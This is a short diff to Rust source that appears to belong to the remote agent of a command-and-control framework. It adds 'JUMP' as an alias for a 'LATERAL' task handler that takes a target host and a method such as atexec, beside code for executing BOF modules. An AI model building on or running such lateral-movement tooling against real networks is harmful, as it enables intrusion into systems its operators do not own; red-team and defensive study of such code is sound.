@@ -1316,7 +1316,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             #[cfg(not(target_os = "windows"))]
             t.send_result(task.id, "", "BOF not supported on this platform");
         }
-        "LATERAL" => {
+        "LATERAL" | "JUMP" => {
             let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
             let method       = j["method"].as_str().unwrap_or("atexec").to_string();
             let host         = j["host"].as_str().unwrap_or("").to_string();
